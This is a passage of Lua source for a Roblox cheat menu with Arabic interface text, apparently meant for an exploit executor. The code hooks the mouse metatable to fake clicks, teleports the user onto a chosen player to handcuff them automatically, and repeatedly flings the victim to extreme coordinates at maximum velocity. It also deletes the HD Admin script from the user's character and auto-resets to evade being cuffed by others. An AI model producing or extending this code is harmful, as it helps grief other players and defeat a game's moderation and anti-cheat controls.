    cuffNotice.TextXAlignment = Enum.TextXAlignment.Center
    cuffNotice.Font = Enum.Font.GothamBold
    cuffNotice.TextSize = 13
    cuffNotice.Parent = KlabshatPage
end

    local newCuffBtn = makeButton("NewCuffBtn", T18T("كلبش جديد"), UDim2.new(0.5, -14, 0, 38), UDim2.new(0, 10, 0, 204), Theme.ButtonBlue, Theme.Accent)
    newCuffBtn.Parent = KlabshatPage

    local nameBox = makeInput("NewCuffName", "اسم الكلبشة (اختياري)", "", UDim2.new(0.5, 4, 0, 204))
    nameBox.Parent = KlabshatPage
    nameBox.Size = UDim2.new(0.5, -14, 0, 38)
    nameBox.TextSize = 13

    local busy = false
    local KEYWORDS = { "cuff", "arrest", "restrain", "كلبش", "esposa" }

    local function looksLikeCuff(name)
        local n = name:lower()
        for _, k in ipairs(KEYWORDS) do
            if n:find(k, 1, true) then return true end
        end
        return false
    end

    local function findNewCuff(hint)
        local char = LocalPlayer.Character
        local bp = LocalPlayer:FindFirstChild("Backpack")
        local containers = {}
        if char then table.insert(containers, char) end
        if bp then table.insert(containers, bp) end

        hint = string.match((hint or ""):lower(), "^%s*(.-)%s*$") or ""
        if hint ~= "" then
            for _, cont in ipairs(containers) do
                for _, item in ipairs(cont:GetChildren()) do
                    if item:IsA("Tool") and item.Name:lower():find(hint, 1, true) then
                        return item
                    end
                end
            end
            return nil
        end

        local old = hangFindCuffTool and hangFindCuffTool() or nil
        for _, cont in ipairs(containers) do
            for _, item in ipairs(cont:GetChildren()) do
                if item:IsA("Tool") and item ~= old and looksLikeCuff(item.Name) then
                    return item
                end
            end
        end
        if char then
            for _, item in ipairs(char:GetChildren()) do
                if item:IsA("Tool") and item ~= old then
                    return item
                end
            end
        end
        return nil
    end

    local function safeCuffClick(bodyPart, noCam)
        local cam = workspace.CurrentCamera
        local origCamType = cam.CameraType
        local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not noCam then
            pcall(function()
                cam.CameraType = Enum.CameraType.Scriptable
                local dir = (bodyPart.Position - myRoot.Position).Unit
                cam.CFrame = CFrame.lookAt(
                    bodyPart.Position - dir * 3 + Vector3.new(0, 0.5, 0),
                    bodyPart.Position
                )
            end)
            task.wait(0.04)
        end

        local vp = cam.ViewportSize
        local tx, ty = vp.X / 2, vp.Y / 2
        if not noCam then
            local sp, vis = cam:WorldToScreenPoint(bodyPart.Position)
            if vis and sp.Z > 0 then tx, ty = sp.X, sp.Y end
        end

        local mouse = LocalPlayer:GetMouse()
        local mt, orig, hooked = nil, nil, false
        pcall(function()
            mt   = getrawmetatable(mouse)
            orig = mt.__index
            setreadonly(mt, false)
            mt.__index = function(self, key)
                if key == "Target" then return bodyPart end
                if key == "Hit"    then return CFrame.new(bodyPart.Position) end
                if type(orig) == "function" then return orig(self, key) end
                return orig[key]
            end
            setreadonly(mt, true)
            hooked = true
        end)

        pcall(function()
            local vim = game:GetService("VirtualInputManager")
            vim:SendMouseButtonEvent(tx, ty, 0, true,  game, 1)
            task.wait(0.03)
            vim:SendMouseButtonEvent(tx, ty, 0, false, game, 1)
        end)
        task.wait(0.05)

        if not noCam then
            pcall(function() cam.CameraType = origCamType end)
        end
        if hooked and mt and orig then
            pcall(function()
                setreadonly(mt, false)
                mt.__index = orig
                setreadonly(mt, true)
            end)
        end
    end

    local function doNewCuffOnce()
        if busy then return end
        local target = findTargetPlayer()
        if not target then return end
        local tool = findNewCuff(nameBox.Text)
        if not tool then return end
        local myChar = LocalPlayer.Character
        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
        local myHum  = myChar and myChar:FindFirstChildOfClass("Humanoid")
        local tgChar = target.Character
        local tgRoot = tgChar and tgChar:FindFirstChild("HumanoidRootPart")
        if not myRoot or not myHum or not tgRoot then return end
        busy = true
        local homeCF = myRoot.CFrame
        pcall(function() myRoot.CFrame = tgRoot.CFrame * CFrame.new(0, 0, 2.8) end)
        task.wait(0.05)
        pcall(function() myHum:EquipTool(tool) end)
        task.wait(0.15)
        local bodyPart = tgChar:FindFirstChild("UpperTorso") or tgChar:FindFirstChild("Torso") or tgRoot
        pcall(function() safeCuffClick(bodyPart) end)
        task.wait(0.4)
        pcall(function() myHum:UnequipTools() end)
        local r = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if r then
            for _ = 1, 6 do r.CFrame = homeCF; RunService.Heartbeat:Wait() end
        end
        busy = false
    end

    newCuffBtn.MouseButton1Click:Connect(function()
        if busy then return end
        local target = findTargetPlayer()
        if not target then
            pcall(function() showNotification(T18T("ما لقيت اللاعب، تاكد من الاسم")) end)
            return
        end
        if not findNewCuff(nameBox.Text) then
            pcall(function() showNotification(T18T("ما لقيت الكلبشة الجديدة، اكتب اسمها بالخانة")) end)
            return
        end
        newCuffBtn.Text = T18T("جاري الكلبشة...")
        task.spawn(function()
            doNewCuffOnce()
            pcall(function() showNotification(T18T("تمت محاولة الكلبشة")) end)
            newCuffBtn.Text = T18T("كلبش جديد")
        end)
    end)

    NewHangBtn = makeButton("NewHangBtn", T18T("تعليق جديد"), UDim2.new(0.5, -14, 0, 38), UDim2.new(0, 10, 0, 248), Theme.ButtonBlue, Theme.Accent)
    NewHangBtn.Parent = KlabshatPage

    NewFreezeBtn = makeButton("NewFreezeBtn", T18T("تجميد جديد"), UDim2.new(0.5, -14, 0, 38), UDim2.new(0.5, 4, 0, 248), Theme.ButtonBlue, Theme.Accent)
    NewFreezeBtn.Parent = KlabshatPage

    local autoHangActive = false
    local AutoHangBtn = makeButton("AutoHangBtn", T18T("اوتو تعليق"), UDim2.new(0.5, -14, 0, 38), UDim2.new(0, 10, 0, 292), Theme.ButtonBlue, Theme.Accent)
    AutoHangBtn.Parent = KlabshatPage

    local function doAutoHang()
        if busy then return end
        local target = findTargetPlayer()
        if not target then return end
        local tool = findNewCuff(nameBox.Text)
        if not tool then return end
        local myChar = LocalPlayer.Character
        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
        local myHum  = myChar and myChar:FindFirstChildOfClass("Humanoid")
        local tgChar = target.Character
        local tgRoot = tgChar and tgChar:FindFirstChild("HumanoidRootPart")
        if not myRoot or not myHum or not tgRoot then return end
        busy = true
        local homeCF = myRoot.CFrame

        -- انتقل للهدف وكلبشه
        pcall(function() myRoot.CFrame = tgRoot.CFrame * CFrame.new(0, 0, 2.8) end)
        task.wait(0.2)
        pcall(function() myHum:EquipTool(tool) end)
        task.wait(0.2)
        local bodyPart = tgChar:FindFirstChild("UpperTorso") or tgChar:FindFirstChild("Torso") or tgRoot
        pcall(function() safeCuffClick(bodyPart) end)
        task.wait(0.2)

        -- روح لنفس مسافة حماية بانق بسرعة قصوى لتفعيل pause على الهدف
        local _hangTarget = Vector3.new(
            1595532131776632803093905408,
            8473378188257436287979487232,
            -40782583619653433808448913408
        )
        pcall(function()
            tgRoot.AssemblyLinearVelocity = Vector3.new(1.7976931348623e+308, 1.7976931348623e+308, 1.7976931348623e+308)
            tgRoot.CFrame = CFrame.new(_hangTarget)
            myRoot.AssemblyLinearVelocity = Vector3.new(1.7976931348623e+308, 1.7976931348623e+308, 1.7976931348623e+308)
            myRoot.CFrame = CFrame.new(_hangTarget)
        end)
        task.wait(0.2)

        -- فك الكلبشة بضغطة وحدة
        pcall(function() safeCuffClick(bodyPart) end)
        task.wait(0.2)

        -- ارجع لمكانك
        pcall(function() myHum:UnequipTools() end)
        task.wait(0.2)
        local r = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if r then
            pcall(function()
                r.AssemblyLinearVelocity = Vector3.zero
                r.CFrame = homeCF
            end)
        end
        busy = false
    end

    AutoHangBtn.MouseButton1Click:Connect(function()
        autoHangActive = not autoHangActive
        if autoHangActive then
            AutoHangBtn.BackgroundColor3 = Theme.Active
            AutoHangBtn.Text = T18T("ايقاف اوتو تعليق")
        else
            AutoHangBtn.BackgroundColor3 = Theme.ButtonBlue
            AutoHangBtn.Text = T18T("اوتو تعليق")
        end
        if not autoHangActive then return end
        task.spawn(function()
            while autoHangActive do
                pcall(doAutoHang)
                task.wait(5)
            end
        end)
    end)

    _T18NewCuff = { find = findNewCuff, click = safeCuffClick, nameBox = nameBox }
end

local HdPrefixLabel = Instance.new("TextLabel")
HdPrefixLabel.Size = UDim2.new(1, -20, 0, 18)
HdPrefixLabel.Position = UDim2.new(0, 10, 0, 348)
HdPrefixLabel.BackgroundTransparency = 1
HdPrefixLabel.Text = "لازم يكون معك مود (احبك)"
HdPrefixLabel.TextColor3 = Theme.Muted
HdPrefixLabel.TextXAlignment = Enum.TextXAlignment.Right
HdPrefixLabel.Font = Enum.Font.Gotham
HdPrefixLabel.TextSize = 12
HdPrefixLabel.Parent = TargetPage

local HdPrefixInput = { Text = "!" }

local HdCopyBtn = makeButton("HdCopyBtn", "نسخ HD", UDim2.new(1, -20, 0, 38), UDim2.new(0, 10, 0, 368), Theme.ButtonBlue, Theme.Accent)
HdCopyBtn.Parent = TargetPage

if LocalPlayer.UserId == 8928118012 then
    local CopyPivotBtn = makeButton("CopyPivotBtn", "نسخ محور", UDim2.new(1, -20, 0, 38), UDim2.new(0, 10, 0, 412), Theme.ButtonBlue, Theme.Accent)
    CopyPivotBtn.Parent = TargetPage
    CopyPivotBtn.MouseButton1Click:Connect(function()
        local target = getTargetPlayer and getTargetPlayer()
        if not target then
            showNotification("ما في لاعب مستهدف")
            return
        end
        local char = target.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root then
            showNotification("ما قدرت احصل على محور اللاعب")
            return
        end
        local cf = root.CFrame
        local pivot = string.format("CFrame.new(%.2f, %.2f, %.2f)", cf.X, cf.Y, cf.Z)
        setclipboard(pivot)
        showNotification("تم نسخ المحور: " .. target.Name)
    end)
end

local _updateTargetPreview
do
    local TargetPreviewFrame = Instance.new("Frame")
    TargetPreviewFrame.Name = "TargetPreviewFrame"
    TargetPreviewFrame.Size = UDim2.new(1, -20, 0, 100)
    TargetPreviewFrame.Position = UDim2.new(0, 10, 0, 54)
    TargetPreviewFrame.BackgroundColor3 = Color3.fromRGB(10, 12, 22)
    TargetPreviewFrame.BackgroundTransparency = 1
    TargetPreviewFrame.BorderSizePixel = 0
    TargetPreviewFrame.ClipsDescendants = true
    TargetPreviewFrame.Parent = TargetPage
    makeCorner(TargetPreviewFrame, 12)
    makeStroke(TargetPreviewFrame, Theme.Active, 1, 0.25)

    local _vpAvatarImg = Instance.new("ImageLabel")
    _vpAvatarImg.Size = UDim2.new(0, 84, 0, 84)
    _vpAvatarImg.Position = UDim2.new(0, 8, 0, 8)
    _vpAvatarImg.BackgroundColor3 = Color3.fromRGB(20, 22, 35)
    _vpAvatarImg.BackgroundTransparency = 1
    _vpAvatarImg.Image = ""
    _vpAvatarImg.ScaleType = Enum.ScaleType.Fit
    _vpAvatarImg.ZIndex = 2
    _vpAvatarImg.Parent = TargetPreviewFrame
    makeCorner(_vpAvatarImg, 10)
    makeStroke(_vpAvatarImg, Theme.Border, 1, 0.3)

    local _vpEmptyIcon = Instance.new("TextLabel")
    _vpEmptyIcon.Size = UDim2.new(0, 84, 0, 84)
    _vpEmptyIcon.Position = UDim2.new(0, 8, 0, 8)
    _vpEmptyIcon.BackgroundTransparency = 1
    _vpEmptyIcon.Text = "👤"
    _vpEmptyIcon.TextColor3 = Theme.Muted
    _vpEmptyIcon.Font = Enum.Font.GothamBold
    _vpEmptyIcon.TextSize = 32
    _vpEmptyIcon.TextXAlignment = Enum.TextXAlignment.Center
    _vpEmptyIcon.TextYAlignment = Enum.TextYAlignment.Center
    _vpEmptyIcon.ZIndex = 3
    _vpEmptyIcon.Parent = TargetPreviewFrame

    local _vpInfoX = 100

    local _vpDisplayLbl = Instance.new("TextLabel")
    _vpDisplayLbl.Size = UDim2.new(1, -(_vpInfoX + 8), 0, 20)
    _vpDisplayLbl.Position = UDim2.new(0, _vpInfoX, 0, 10)
    _vpDisplayLbl.BackgroundTransparency = 1
    _vpDisplayLbl.Text = ""
    _vpDisplayLbl.TextColor3 = Theme.Text
    _vpDisplayLbl.Font = Enum.Font.GothamBold
    _vpDisplayLbl.TextSize = 14
    _vpDisplayLbl.TextXAlignment = Enum.TextXAlignment.Left
    _vpDisplayLbl.TextTruncate = Enum.TextTruncate.AtEnd
    _vpDisplayLbl.ZIndex = 2
    _vpDisplayLbl.Parent = TargetPreviewFrame

    local _vpUserIdLbl = Instance.new("TextLabel")
    _vpUserIdLbl.Size = UDim2.new(1, -(_vpInfoX + 8), 0, 17)
    _vpUserIdLbl.Position = UDim2.new(0, _vpInfoX, 0, 34)
    _vpUserIdLbl.BackgroundTransparency = 1
    _vpUserIdLbl.Text = ""
    _vpUserIdLbl.TextColor3 = Theme.Muted
    _vpUserIdLbl.Font = Enum.Font.Gotham
    _vpUserIdLbl.TextSize = 12
    _vpUserIdLbl.TextXAlignment = Enum.TextXAlignment.Left
    _vpUserIdLbl.ZIndex = 2
    _vpUserIdLbl.Parent = TargetPreviewFrame

    local _vpJoinLbl = Instance.new("TextLabel")
    _vpJoinLbl.Size = UDim2.new(1, -(_vpInfoX + 8), 0, 17)
    _vpJoinLbl.Position = UDim2.new(0, _vpInfoX, 0, 54)
    _vpJoinLbl.BackgroundTransparency = 1
    _vpJoinLbl.Text = ""
    _vpJoinLbl.TextColor3 = Theme.Muted
    _vpJoinLbl.Font = Enum.Font.Gotham
    _vpJoinLbl.TextSize = 12
    _vpJoinLbl.TextXAlignment = Enum.TextXAlignment.Left
    _vpJoinLbl.ZIndex = 2
    _vpJoinLbl.Parent = TargetPreviewFrame

    local _vpAgeLbl = Instance.new("TextLabel")
    _vpAgeLbl.Size = UDim2.new(1, -(_vpInfoX + 8), 0, 17)
    _vpAgeLbl.Position = UDim2.new(0, _vpInfoX, 0, 74)
    _vpAgeLbl.BackgroundTransparency = 1
    _vpAgeLbl.Text = ""
    _vpAgeLbl.TextColor3 = Color3.fromRGB(100, 200, 120)
    _vpAgeLbl.Font = Enum.Font.Gotham
    _vpAgeLbl.TextSize = 12
    _vpAgeLbl.TextXAlignment = Enum.TextXAlignment.Left
    _vpAgeLbl.ZIndex = 2
    _vpAgeLbl.Parent = TargetPreviewFrame

    local _vpCurrentName = ""
    _updateTargetPreview = function(playerName)
        if playerName == _vpCurrentName then return end
        _vpCurrentName = playerName
        local targetPlayer = Players:FindFirstChild(playerName)
        if not targetPlayer then
            _vpDisplayLbl.Text = ""
            _vpUserIdLbl.Text = ""
            _vpJoinLbl.Text = ""
            _vpAgeLbl.Text = ""
            _vpAvatarImg.Image = ""
            _vpEmptyIcon.Visible = true
            return
        end
        _vpEmptyIcon.Visible = false

        _vpAvatarImg.Image = "rbxthumb://type=AvatarHeadShot&id=" .. targetPlayer.UserId .. "&w=420&h=420"

        _vpDisplayLbl.Text = targetPlayer.DisplayName .. " (" .. targetPlayer.Name .. ")"

        _vpUserIdLbl.Text = "رقم الحساب: " .. tostring(targetPlayer.UserId)

        local ageDays = targetPlayer.AccountAge
        local joinTime = os.time() - (ageDays * 86400)
        local d = os.date("*t", joinTime)
        _vpJoinLbl.Text = string.format("تاريخ التسجيل: %02d/%02d/%04d", d.day, d.month, d.year)

        local years = math.floor(ageDays / 365)
        local months = math.floor((ageDays % 365) / 30)
        if years > 0 then
            _vpAgeLbl.Text = " " .. years .. " سنة و" .. months .. " شهر"
        else
            _vpAgeLbl.Text = " " .. months .. " شهر"
        end
    end
end

_inputSuggestions = Instance.new("Frame")
_inputSuggestions.Name = "InputSuggestions"
_inputSuggestions.Size = UDim2.new(1, -112, 0, 0)
_inputSuggestions.Position = UDim2.new(0, 10, 0, 212)
_inputSuggestions.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
_inputSuggestions.BackgroundTransparency = 0.15
_inputSuggestions.BorderSizePixel = 0
_inputSuggestions.Visible = false
_inputSuggestions.ZIndex = 90
_inputSuggestions.ClipsDescendants = true
_inputSuggestions.Parent = TargetPage
makeCorner(_inputSuggestions, 8)
_inputSuggestionsLayout = Instance.new("UIListLayout")
_inputSuggestionsLayout.Padding = UDim.new(0, 1)
_inputSuggestionsLayout.SortOrder = Enum.SortOrder.LayoutOrder
_inputSuggestionsLayout.Parent = _inputSuggestions
_inputSuggestionsPad = Instance.new("UIPadding")
_inputSuggestionsPad.PaddingLeft = UDim.new(0, 8)
_inputSuggestionsPad.PaddingRight = UDim.new(0, 8)
_inputSuggestionsPad.PaddingTop = UDim.new(0, 3)
_inputSuggestionsPad.PaddingBottom = UDim.new(0, 3)
_inputSuggestionsPad.Parent = _inputSuggestions

function _hideInputSuggestions()
    _inputSuggestions.Visible = false
    for _, child in ipairs(_inputSuggestions:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end
end

function _showInputSuggestions(matches)
    for _, child in ipairs(_inputSuggestions:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end

    local shown = math.min(#matches, 6)
    _inputSuggestions.Size = UDim2.new(1, -112, 0, shown * 24 + 6)

    for i = 1, shown do
        local player = matches[i]
        local sug = Instance.new("TextButton")
        sug.Size = UDim2.new(1, 0, 0, 22)
        sug.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        sug.BackgroundTransparency = 1
        sug.BorderSizePixel = 0
        sug.AutoButtonColor = false
        sug.Text = ":" .. player.Name
        sug.TextColor3 = Theme.Text
        sug.TextXAlignment = Enum.TextXAlignment.Right
        sug.Font = Enum.Font.Gotham
        sug.TextSize = 13
        sug.LayoutOrder = i
        sug.ZIndex = 91
        sug.Parent = _inputSuggestions
        makeCorner(sug, 5)

        sug.MouseEnter:Connect(function()
            sug.BackgroundTransparency = 0.9
            sug.TextColor3 = Theme.Accent
        end)
        sug.MouseLeave:Connect(function()
            sug.BackgroundTransparency = 1
            sug.TextColor3 = Theme.Text
        end)

        local chosenName = player.Name
        sug.MouseButton1Click:Connect(function()
            Input.Text = chosenName
            _hideInputSuggestions()
            _updateTargetPreview(chosenName)
        end)
    end

    _inputSuggestions.Visible = shown > 0
end

Input:GetPropertyChangedSignal("Text"):Connect(function()
    local txt = Input.Text
    if #txt >= 3 then

        local found = Players:FindFirstChild(txt)
        if not found then

            local partials = {}
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name:lower():find(txt:lower(), 1, true) then
                    table.insert(partials, p)
                end
            end
            if #partials == 1 then
                found = partials[1]
                _hideInputSuggestions()
            elseif #partials > 1 then

                _showInputSuggestions(partials)
                found = nil
            else
                _hideInputSuggestions()
            end
        else
            _hideInputSuggestions()
        end
        _updateTargetPreview(found and found.Name or "")
    else
        _hideInputSuggestions()
        _updateTargetPreview("")
    end
end)

local TargetScrollFrame = Instance.new("ScrollingFrame")
TargetScrollFrame.Size = UDim2.new(1, 0, 1, 0)
TargetScrollFrame.BackgroundTransparency = 1
TargetScrollFrame.BorderSizePixel = 0
TargetScrollFrame.ScrollBarThickness = isTouchDevice and 3 or 4
TargetScrollFrame.ScrollBarImageColor3 = Theme.Active
TargetScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 420)
TargetScrollFrame.ScrollingDirection = Enum.ScrollingDirection.Y
TargetScrollFrame.ElasticBehavior = Enum.ElasticBehavior.Always
TargetScrollFrame.Parent = TargetPage
for _, child in ipairs(TargetPage:GetChildren()) do
    if child ~= TargetScrollFrame then
        child.Parent = TargetScrollFrame
    end
end

FlyBtn.Parent = PlayerPage
FlyBtn.Size = UDim2.new(0.5, -14, 0, 38)
FlyBtn.Position = UDim2.new(0, 10, 0, 54)

SpeedInput.Parent = PlayerPage
SpeedInput.Size = UDim2.new(0.5, -14, 0, 38)
SpeedInput.Position = UDim2.new(0.5, 4, 0, 54)

WalkSpeedBtn.Parent = PlayerPage
WalkSpeedBtn.Size = UDim2.new(0.5, -14, 0, 38)
WalkSpeedBtn.Position = UDim2.new(0, 10, 0, 98)

WalkSpeedInput.Parent = PlayerPage
WalkSpeedInput.Size = UDim2.new(0.5, -14, 0, 38)
WalkSpeedInput.Position = UDim2.new(0.5, 4, 0, 98)

SpeedLabel.Parent = PlayerPage
SpeedLabel.Size = UDim2.new(1, -20, 0, 20)
SpeedLabel.Position = UDim2.new(0, 10, 0, 144)

SavePlaceBtn.Parent = PlayerPage
SavePlaceBtn.Size = UDim2.new(0.5, -14, 0, 38)
SavePlaceBtn.Position = UDim2.new(0, 10, 0, 170)

local HdCmdLabel = Instance.new("TextLabel")
HdCmdLabel.Size = UDim2.new(1, -20, 0, 16)
HdCmdLabel.Position = UDim2.new(0, 10, 0, 54)
HdCmdLabel.BackgroundTransparency = 1
HdCmdLabel.Text = "اوامر HD ما تمر عبر الشات"
HdCmdLabel.TextColor3 = Theme.Muted
HdCmdLabel.TextXAlignment = Enum.TextXAlignment.Right
HdCmdLabel.Font = Enum.Font.Gotham
HdCmdLabel.TextSize = 12
HdCmdLabel.Parent = OthersPage

local HdCmdInput = Instance.new("TextBox")
HdCmdInput.Name = "HdCmdInput"
HdCmdInput.Size = UDim2.new(1, -136, 0, 38)
HdCmdInput.Position = UDim2.new(0, 10, 0, 72)
HdCmdInput.BackgroundColor3 = Theme.Input
HdCmdInput.BackgroundTransparency = 0.2
HdCmdInput.PlaceholderText = "اكتب الامر هنا"
HdCmdInput.Text = ""
HdCmdInput.TextColor3 = Theme.Text
HdCmdInput.PlaceholderColor3 = Theme.Muted
HdCmdInput.Font = Enum.Font.Gotham
HdCmdInput.TextSize = 14
HdCmdInput.TextXAlignment = Enum.TextXAlignment.Right
HdCmdInput.ClearTextOnFocus = false
HdCmdInput.Parent = OthersPage
makeCorner(HdCmdInput, 10)
makeStroke(HdCmdInput, Theme.Border, 1, 0.2)
applyClickToClear(HdCmdInput)

local HdCmdSendBtn = makeButton("HdCmdSendBtn", "ارسال", UDim2.new(0, 58, 0, 38), UDim2.new(1, -126, 0, 72), Theme.ButtonBlue, Theme.Accent)
HdCmdSendBtn.Parent = OthersPage

ZombieWalkBtn.Parent = OthersPage
ZombieWalkBtn.Size = UDim2.new(0.5, -14, 0, 38)
ZombieWalkBtn.Position = UDim2.new(0, 10, 0, 112)
_G._HLBtn.Parent = OthersPage
_G._HLBtn.Size = UDim2.new(0.5, -14, 0, 38)
_G._HLBtn.Position = UDim2.new(0.5, 4, 0, 112)

local AntiAFK = {active=false, conn=nil, btn=nil}
AntiAFK.btn = makeButton("AntiAFKBtn", "مضاد افك", UDim2.new(0.5, -14, 0, 34), UDim2.new(0, 10, 0, 54), Theme.ButtonBlue, Theme.Accent)
AntiAFK.btn.Parent = MudadatPage

_G.CuffProtectBtn = makeButton("CuffProtectBtn", "حماية كلبشة", UDim2.new(0.5, -14, 0, 34), UDim2.new(0, 10, 0, 94), Theme.ButtonBlue, Theme.Accent)
_G.CuffProtectBtn.Parent = MudadatPage

do
    local _cuff2Active     = false
    local _cuff2Conns      = {}
    local _savedCFrame     = nil
    local _resetInProgress = false

    local _cuff2Btn = makeButton(
        "CuffProtect2Btn", "حماية كلبشه2",
        UDim2.new(0.5, -14, 0, 34),
        UDim2.new(0.5,   4, 0, 94),
        Theme.ButtonBlue, Theme.Accent
    )
    _cuff2Btn.Parent = MudadatPage

    local function isCuffed(char)

        for _, obj in ipairs(char:GetDescendants()) do
            if obj:IsA("WeldConstraint") then
                local p0, p1 = obj.Part0, obj.Part1
                if p0 and p0.Parent and not p0:IsDescendantOf(char) then return true end
                if p1 and p1.Parent and not p1:IsDescendantOf(char) then return true end
            end
        end

        -- (تم حذف فحص workspace:GetDescendants() لأنه كان يمسح الماب كله عدة مرات بالثانية
        --  ويسبب دروب فريم. الكشف عن الـ Weld الخارجي يتم بالأحداث عبر workspace.DescendantAdded)

        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum and hum.PlatformStand then return true end

        local cv = char:FindFirstChild("Cuffing")
        if cv and cv:IsA("BoolValue") and cv.Value == true then return true end

        local anchorParts = {"UpperTorso", "LowerTorso", "HumanoidRootPart", "Torso"}
        for _, pName in ipairs(anchorParts) do
            local part = char:FindFirstChild(pName)
            if part and part:IsA("BasePart") and part.Anchored then
                return true
            end
        end
        return false
    end

    local function removeHDAdminScript(char)
        pcall(function()
            local s = char:FindFirstChild("HDAdminStarterCharacter")
            if s then
                s:Destroy()
                warn("[CuffProtect2] حُذف HDAdminStarterCharacter من الشخصية")
            end
        end)
    end

    local function doReset(hum)
        if _resetInProgress then return end
        _resetInProgress = true

        local savedCF = _savedCFrame

        showNotification(" كلبشة مكتشفة! ريسيت تلقائي...")
        pcall(function() hum.Health = 0 end)

        task.spawn(function()

            local newChar = LocalPlayer.CharacterAdded:Wait()
            local newRoot = newChar:WaitForChild("HumanoidRootPart", 8)
            local newHum  = newChar:WaitForChild("Humanoid", 8)

            if newRoot and newHum and savedCF then

                local t = tick()
                repeat task.wait(0.05) until newHum.Health > 0 or tick() - t > 6
                task.wait(0.2)

                pcall(function()
                    newRoot.CFrame = savedCF
                end)
                showNotification(" رجعت لنفس المكان!")
            end

            task.wait(1.5)
            _resetInProgress = false
        end)
    end

    local function watchChar(char)
        if not char then return end
        local hum  = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        if not hum or not root then return end

        removeHDAdminScript(char)

        local hdConn
        hdConn = char.ChildAdded:Connect(function(child)
            if child.Name == "HDAdminStarterCharacter" then
                task.defer(function()
                    pcall(function() child:Destroy() end)
                    warn("[CuffProtect2] HDAdminStarterCharacter اُضيف ثم حُذف فوراً")
                end)
            end
        end)
        table.insert(_cuff2Conns, hdConn)

        local anchoredParts = {"UpperTorso", "LowerTorso", "HumanoidRootPart", "Torso"}
        for _, pName in ipairs(anchoredParts) do
            local part = char:FindFirstChild(pName)
            if part and part:IsA("BasePart") then
                local anchorConn
                anchorConn = part:GetPropertyChangedSignal("Anchored"):Connect(function()
                    if not _cuff2Active or _resetInProgress then return end
                    if part.Anchored then
                        warn("[CuffProtect2] Anchored=true على: " .. pName)
                        pcall(function() anchorConn:Disconnect() end)
                        local curHum = char:FindFirstChildOfClass("Humanoid")
                        if curHum and curHum.Health > 0 then doReset(curHum) end
                    end
                end)
                table.insert(_cuff2Conns, anchorConn)
            end
        end

        _savedCFrame = root.CFrame

        task.spawn(function()
            while _cuff2Active and char.Parent do
                task.wait(2)
                if _resetInProgress then continue end
                local curRoot = char:FindFirstChild("HumanoidRootPart")
                local curHum  = char:FindFirstChildOfClass("Humanoid")
                if curRoot and curHum and curHum.Health > 0 then
                    local state = curHum:GetState()
                    if (state == Enum.HumanoidStateType.Running
                    or  state == Enum.HumanoidStateType.Landed
                    or  state == Enum.HumanoidStateType.Jumping
                    or  state == Enum.HumanoidStateType.Freefall)
                    and not isCuffed(char) then
                        _savedCFrame = curRoot.CFrame
                    end
                end
            end
        end)

        local monitor
        local wsConn = hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
            if _resetInProgress or not _cuff2Active then return end
            if hum.WalkSpeed == 0 then
                task.delay(0.25, function()
                    if _resetInProgress or not _cuff2Active then return end
                    if hum.WalkSpeed == 0 then
                        if monitor then pcall(function() monitor:Disconnect() end) end
                        doReset(hum)
                    end
                end)
            else
                lastWS = hum.WalkSpeed
            end
        end)
        table.insert(_cuff2Conns, wsConn)

        local _lastCheck = 0
        monitor = RunService.Heartbeat:Connect(function()
            local now = tick()
            if now - _lastCheck < 0.5 then return end
            _lastCheck = now

            if not _cuff2Active or not char.Parent
            or hum.Health <= 0 or _resetInProgress then
                pcall(function() monitor:Disconnect() end)
                return
            end

            if isCuffed(char) then
                pcall(function() monitor:Disconnect() end)
                local curHum = char:FindFirstChildOfClass("Humanoid")
                if curHum and curHum.Health > 0 then doReset(curHum) end
            end
        end)

        table.insert(_cuff2Conns, monitor)

        local descConn
        descConn = char.DescendantAdded:Connect(function(obj)
            if _resetInProgress or not _cuff2Active then
                pcall(function() descConn:Disconnect() end)
                return
            end
            if obj:IsA("WeldConstraint") then
                task.defer(function()
                    if _resetInProgress then return end
                    local p0, p1 = obj.Part0, obj.Part1
                    if (p0 and p0.Parent and not p0:IsDescendantOf(char))
                    or (p1 and p1.Parent and not p1:IsDescendantOf(char)) then
                        pcall(function() descConn:Disconnect() end)
                        pcall(function() monitor:Disconnect() end)
                        local curHum = char:FindFirstChildOfClass("Humanoid")
                        if curHum and curHum.Health > 0 then doReset(curHum) end
                    end
                end)
            end
        end)
        table.insert(_cuff2Conns, descConn)

        local wsConn
        wsConn = workspace.DescendantAdded:Connect(function(obj)
            if _resetInProgress or not _cuff2Active then return end
            if not obj:IsA("WeldConstraint") then return end
            task.defer(function()
                if _resetInProgress then return end
                local p0, p1 = obj.Part0, obj.Part1

                local charInvolved = (p0 and p0:IsDescendantOf(char))
                                  or (p1 and p1:IsDescendantOf(char))
                if not charInvolved then return end

                local externalFound = (p0 and p0.Parent and not p0:IsDescendantOf(char))
                                   or (p1 and p1.Parent and not p1:IsDescendantOf(char))
                if externalFound then
                    warn("[CuffProtect2] WeldConstraint خارجي مكتشف في Workspace!")
                    pcall(function() wsConn:Disconnect() end)
                    pcall(function() monitor:Disconnect() end)
                    local curHum = char:FindFirstChildOfClass("Humanoid")
                    if curHum and curHum.Health > 0 then doReset(curHum) end
                end
            end)
        end)
        table.insert(_cuff2Conns, wsConn)

        for _, bodyPart in ipairs(char:GetChildren()) do
            if bodyPart:IsA("BasePart") then
                local partConn
                partConn = bodyPart.DescendantAdded:Connect(function(obj)
                    if _resetInProgress or not _cuff2Active then
                        pcall(function() partConn:Disconnect() end)
                        return
                    end
                    if obj:IsA("WeldConstraint") then
                        task.defer(function()
                            if _resetInProgress then return end
                            local p0, p1 = obj.Part0, obj.Part1
                            if (p0 and not p0:IsDescendantOf(char))
                            or (p1 and not p1:IsDescendantOf(char)) then
